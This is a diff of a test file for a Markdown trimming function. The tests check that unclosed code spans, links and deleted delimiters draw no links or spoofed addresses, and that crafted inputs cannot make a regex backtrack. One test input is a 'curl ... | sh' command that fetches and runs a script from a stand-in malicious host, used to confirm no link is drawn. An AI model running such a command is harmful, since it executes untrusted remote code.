@@ -195,7 +195,21 @@ describe("the first block is itself unfinished", () => {
     ["a link whose destination was cut", "[リンク](https://exa", "リンク"],
     ["a bold headline and an unclosed link", "**a [b](x y** 後 t", "a "],
     ["nothing before the cut", "前 **a [b](x y** 後 t", "前 "],
-    ["a code span: the delimiters after it are code in the full line", "`code と **b", "code と "],
+    // What follows an unclosed backtick may be code in the full text, where
+    // nothing is a link and a delimiter is a letter.
+    ["a code span that is not closed ends the text", "`code と **b", ""],
+    ["the delimiters before it still go", "**a `b", "a "],
+    ["a link after it is not drawn", "`a [x](http://a.co/x) tail", ""],
+    ["an autolink after it is not drawn", "`curl <https://evil.example/install.sh> | sh", ""],
+    // Deleting a delimiter must not join the text around it into an address,
+    // and the text after a deleted bracket may be a link label in the full text.
+    ["a deleted star that joins an address", "*www.[github.com.evil.io details ", ""],
+    ["a deleted bracket that joins an address", "[www.[github.com more ", ""],
+    ["a deleted tilde that joins an address", "~www.[c.d ", ""],
+    ["a join across several deletions", "*]( www.*y/[\n", ""],
+    ["an address in an unfinished link label", "[see http://a.co/x and more", ""],
+    ["a closed link in an unfinished bold keeps its link", "**状況 [issue 514](https://x.example/1) 完了", "状況 [issue 514](https://x.example/1) 完了"],
+    ["and loses only the star after it", "**状況 [issue 514](https://x.example/1) 完了 *注", "状況 [issue 514](https://x.example/1) 完了 注"],
     ["two kinds", "~~消す と **b", "消す と b"],
     ["a code span that cannot be closed inside a link label", "[`a]b", ""],
     ["the same, closed", "[`a]b`", ""],
@@ -211,6 +225,20 @@ describe("a head that is complete", () => {
     ["has no unfinished construct", "前文 **太字** と `code` と [a](https://e.example/a) の文"],
   ])("is left as it is when it %s", (_name, head) => {
     expect(trim(head)).toEqual({ shown: head, fallbacks: 0 });
+  });
+
+  // The lexer expands the tabs of a list item's text, so a head with a tab in a
+  // list item would not line up with its own text: four spaces say the same.
+  it.each([
+    ["a tab in a list item", "- a\t**b", "- a    "],
+    ["a tab in an ordered item", "1. a\t**b", "1. a    "],
+    ["a tab on a continuation line", "- a\n  b\t**c", "- a\n  b    "],
+    ["a tab before an address", "- x\thttp://a.com/b", "- x    "],
+    ["two tabs", "- a\t\t**b", "- a        "],
+    ["a tab in a quote", "> a\t**b", "> a    "],
+    ["a tab in a paragraph", "a\t**b", "a    "],
+  ])("reads %s", (_name, head, shown) => {
+    expect(trim(head)).toEqual({ shown, fallbacks: 0 });
   });
 
   it("gives carriage returns the lexer's reading", () => {
@@ -244,6 +272,27 @@ describe("a cut never lands inside a character", () => {
   });
 });
 
+// Each of these made the old marker pattern try 2^n ways to match a line that
+// does not match. The wall clock cannot interrupt a regex, so the bound is only
+// for a reader; the proof is that the test ends at all.
+describe("a head built to make a pattern backtrack", () => {
+  it.each([
+    ["nested quotes with one space", "> ".repeat(60) + "x".repeat(450)],
+    ["nested quotes with two spaces after a line", "status\n" + ">  ".repeat(30) + "tail"],
+    ["nested quotes ending in text", "> ".repeat(40) + "x"],
+    ["bullets ending in text", "- ".repeat(200) + "x"],
+    ["rule characters ending in text", "-".repeat(500) + "x"],
+    ["mixed markers ending in text", "> - > 1. ".repeat(50) + "x"],
+    ["fence characters ending in text", "`".repeat(300) + "x"],
+  ])("%s", (_name, head) => {
+    const started = performance.now();
+    const result = trim(head);
+
+    expect(performance.now() - started).toBeLessThan(2000);
+    expect(result.fallbacks).toBe(0);
+  });
+});
+
 describe("a lexer that does not agree with the head", () => {
   const head = "前文\n続き **a";
 
@@ -272,12 +321,14 @@ describe("a lexer that does not agree with the head", () => {
     expect(trim(head)).toEqual({ shown: "前文\n", fallbacks: 1 });
   });
 
-  it("falls back to the head, and says so, when the lexer throws", () => {
+  // A head that is not trimmed could draw a link to a half address, so a failure
+  // shows the empty-head sentence instead.
+  it("shows nothing, and says so, when the lexer throws", () => {
     vi.spyOn(untrustedMarked, "lexer").mockImplementation(() => {
       throw new Error("lexer failure");
     });
 
-    expect(trim(head)).toEqual({ shown: head, fallbacks: 1 });
+    expect(trim(head)).toEqual({ shown: "", fallbacks: 1 });
   });
 });
 
